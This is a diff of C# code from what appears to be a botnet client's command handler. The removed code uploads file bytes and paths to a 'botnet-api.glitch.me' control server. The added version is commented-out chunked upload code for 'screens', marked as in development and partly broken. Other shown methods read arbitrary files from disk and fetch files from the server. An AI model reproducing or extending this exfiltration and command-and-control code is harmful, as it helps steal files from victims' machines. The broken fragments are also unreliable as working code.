@@ -22,8 +22,7 @@ namespace CommandHandler
     }
     public class FileC
     {
-        public uint id { get; set; }
-        public string filepath { get; set; }
+        public string fileformat { get; set; }
         public byte[] file { get; set; }
     }
     public class Command
@@ -57,12 +56,45 @@ namespace CommandHandler
         }
         public static async Task SendFileAsync(uint id, string ip, string path, byte[] bt)
         {
-            HttpClient client = new HttpClient();
-            client.BaseAddress = new Uri("http://botnet-api.glitch.me/");
-            FileC file = new FileC { id = id, filepath = path, file = bt };
-            string json = new JavaScriptSerializer().Serialize(file);
-            await client.PostAsync($"/api/v1/getfiles/{ip}", new StringContent(json));
-        }
+            //HttpClient client = new HttpClient();
+            //client.BaseAddress = new Uri("http://botnet-api.glitch.me/");
+            //List<byte[]> btlist = new List<byte[]>();
+            //int value = 0;
+            //for (int i = 0; i < (bt.Length / 20000) + 1; i++)
+            //{
+            //    if (bt.Length - value > 20000)
+            //    {
+            //        byte[] btt = new byte[20000];
+            //        btlist.Add(btt);
+            //        Array.ConstrainedCopy(bt, value, btlist[i], 0, 20000);
+            //        value += 20000;
+            //    }
+            //    else
+            //    {
+            //        byte[] btt = new byte[bt.Length - value];
+            //        btlist.Add(btt);
+            //        Array.ConstrainedCopy(bt, value, btlist[i], 0, bt.Length - value);
+            //    }
+            //}
+            //for (int i = 0; i < btlist.Count; i++)
+            //{
+            //    if (i == 0)
+            //    {
+            //        FileC screen = new FileC {  = btlist[i] };
+            //        string json = new JavaScriptSerializer().Serialize(screen);
+            //        respgl = await client.PostAsync($"/api/v1/screens/{Id}", new StringContent(json));
+            //        respgl.EnsureSuccessStatusCode();
+            //        sid = respgl.Content.ReadAsStringAsync().Result;
+            //    }
+            //    else
+            //    {
+            //        ScreenC screen = new ScreenC { bytes = btlist[i] };
+            //        string json = new JavaScriptSerializer().Serialize(screen);
+            //        var resp = await client.PostAsync($"/api/v1/screens/{Id}/{respgl.Content.ReadAsStringAsync().Result}", new StringContent(json));
+            //        resp.EnsureSuccessStatusCode();
+            //    }
+            //}
+        } //В разработке
         public static async Task<byte[]> GetFileAsync(string Ip)
         {
             HttpClient client = new HttpClient();
@@ -394,7 +426,7 @@ namespace CommandHandler
         }
         public static byte[] codeToSend(string path)
         {
-            var bytearray = File.ReadAllBytes(path);
+            byte[] bytearray = File.ReadAllBytes(path);
             return bytearray;
         }
         public static void codeToGet(byte[] file, string path)
